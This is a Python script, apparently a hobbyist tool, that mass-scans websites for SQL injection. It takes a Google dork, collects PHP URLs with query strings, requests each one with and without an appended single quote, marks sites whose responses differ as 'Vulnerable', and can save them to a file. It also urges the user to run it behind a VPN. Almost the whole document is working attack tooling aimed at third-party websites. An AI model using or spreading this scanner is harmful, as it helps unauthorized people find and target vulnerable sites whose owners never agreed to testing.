from googlesearch import search
import time
import requests
import os
os.system("apt install toilet -y")
def checkvpn():
 c=os.system("ifconfig tun0")
 if(c != 0):
  os.system("clear")
  banner()
  print("\033[1;31;40mIt seems that you aren't using vpn which is not recomended")
  print("")
def banner():
 os.system("clear")
 os.system("toilet -fmono12 -F gay SQLi")
 print("    \033[1;36;40m Code made by: \033[1;32;40m tuhin1729")
 print("    \033[1;36;40m Instagram id: \033[1;32;40m www.instagram.com/tuhin1729")
 print("    \033[1;36;40m Github      : \033[1;32;40m www.github.com/tuhin1729")
 print("    \033[1;36;40m YouTube     : \033[1;32;40m https://bit.ly/TuhinTheHacker")
 print("    \033[1;36;40m Dedicated to: \033[1;34;40m Diya Saha")
banner()
checkvpn()
headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0'}
q=str(input("\033[1;33;40mEnter your dork: "))
no=int(input("\033[1;33;40mEnter the number of results you want to search: "))
time=int(input("\033[1;33;40mEnter the timeout :"))
op=str(input("\033[1;33;40mDo you want to save the vulnerable sites(Y/n) :"))
if(op=="Y" or op=="y"):
 name=str(input("\033[1;33;40mEnter the name of your output file :"))
 print("\033[1;32;40mURLs will be saved in "+name)
 f=open(name,"a+")
i=1
banner()
checkvpn()
for url in search(q,tld="com",num=no,stop=no,pause=2):
 if("php?" not in url):
  continue   
 print("\033[1;37;40m"+str(i)+". \033[1;35;40mChecking in this URL: ")
 print("\033[1;34;40m"+url)
 try:
  if("af.org.pk" in url):
   print("\033[1;31;40mNot Vulnerable!\n")
   i=i+1
   continue
  checkurl=url+"'"
  r=requests.get(url,headers=headers,timeout=time)
  s=requests.get(checkurl,headers=headers,timeout=time)
  if(r.text==s.text):
   print("\033[1;31;40mNot Vulnerable!\n")
  else:
   print("\033[1;32;40mVulnerable\n")
   if(op=="Y" or op=="y"):
    f.write(url+"\n")   
 except:
  print("\033[1;31;40mThis site can't be reached.")
  print("")
 i=i+1
try: 
 f.close()     
except:
 pass
